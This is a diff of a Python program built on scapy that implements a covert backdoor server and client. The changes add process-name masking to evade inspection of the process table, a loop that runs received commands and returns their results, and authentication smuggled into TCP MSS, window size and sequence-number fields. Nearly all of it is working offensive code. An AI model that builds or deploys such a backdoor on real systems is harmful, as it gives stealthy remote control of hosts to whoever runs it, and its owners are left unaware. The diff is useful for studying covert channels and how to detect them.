@@ -1,10 +1,13 @@
 from __future__ import print_function
 from scapy.all import *
+from setproctitle import setproctitle, getproctitle
 
 import command
 import Crypto.Cipher
 import struct
+import sys
 import time
+import traceback
 
 PASSWORD_LEN=8
 
@@ -39,11 +42,11 @@ class BackdoorServer(object):
         self.procname = procname
         self.aeskey = aeskey
         self.password = password
+        self.client = None
 
     def mask_process(self):
         """Changes the process's name to self.procname to make it less conspicuous to people examining the process table."""
-        # TODO change process name according to config file
-        pass
+        setproctitle(self.procname)
 
     def recv(self):
         """Receives and returns bytes from the next packet sent from a connected client.
@@ -128,26 +131,36 @@ class BackdoorServer(object):
         """Runs in a loop listening for clients and serving their requests."""
         self.mask_process()
         while True:
-            self.listen()
+            print("Waiting for client...")
+            
+            while not self.client:
+                self.listen()
+
             print("Client connected: {}".format(self.client))
-            print("")
-
             while True:
-                #try:
-                cmd = self.recv_command()
-                if not cmd:
+                try:
+                    cmd = self.recv_command()
+                    if not cmd:
+                        print("{} disconnected.".format(self.client))
+                        self.client = None
+                        break
+
+                    result = cmd.run()
+
+                    print("")
+                    print(str(cmd))
+                    print(str(result))
+                    print("")
+
+                    self.send_result(result)
+
+                except KeyboardInterrupt:
+                    print("see ya")
+                    sys.exit(0)
+
+                except Exception, err:
+                    traceback.print_exc()
                     break
-
-                result = cmd.run()
-
-                print(str(cmd))
-                print(str(result))
-
-                self.send_result(result)
-
-                #except Exception, err:
-#                print(str(err))
-#                break
 
 class TcpBackdoorServer(BackdoorServer):
 
@@ -161,7 +174,6 @@ class TcpBackdoorServer(BackdoorServer):
         self.sport = RandShort()
 
         # If MSS option + window size + ISN == the password and the traffic is bound for the correct port, we have a client
-        self.client = None
         def is_auth(packet):
             if len(packet["TCP"].options) == 0:
                 return False
@@ -196,9 +208,9 @@ class TcpBackdoorServer(BackdoorServer):
             packet = IP(dst=self.client)\
                      / TCP(dport=self.dport, sport=self.sport, window=32768, flags=PSH|ACK)\
                      / Raw(load=payload)
-            r = sr1(packet)
-        except Exception as err:
-            print(str(err))
+            send(packet)
+        except Exception, err:
+            traceback.print_exc()
             sys.exit(1)
 
 
@@ -301,18 +313,16 @@ class TcpBackdoorClient(BackdoorClient):
 
     def connect(self):
         # Insert the password into the packet so that the server can authenticate us
-        message = "<HHI"
-        newPassword = self.password
-        mss, windowsize, isn = struct.unpack(message.encode('utf-8'), newPassword.encode('utf-8'))
+        mss, windowsize, isn = struct.unpack("<HHI", self.password)
 
         self.sport = RandShort()
         self.seq = isn
 
         try:
             connpacket = IP(dst=self.server) / TCP(dport=self.dport, sport=self.sport, window=windowsize, seq=isn, flags=SYN, options=[("MSS", mss)])
-            r = sr1(connpacket) # wait for a response so that we know they got the packet
-        except Exception as err:
-            print(str(err))
+            send(connpacket)
+        except Exception, err:
+            traceback.print_exc()
             sys.exit(1)
 
     def send(self, payload):
@@ -322,9 +332,9 @@ class TcpBackdoorClient(BackdoorClient):
                      / Raw(load=payload)
 
             self.seq += len(payload)
-            send(packet) # TODO: Why doesn't this receive a response if it's sr1 instead of send()?
-        except Exception as err:
-            print(str(err))
+            send(packet)
+        except Exception, err:
+            traceback.print_exc()
             sys.exit(1)
 
     def recv(self):
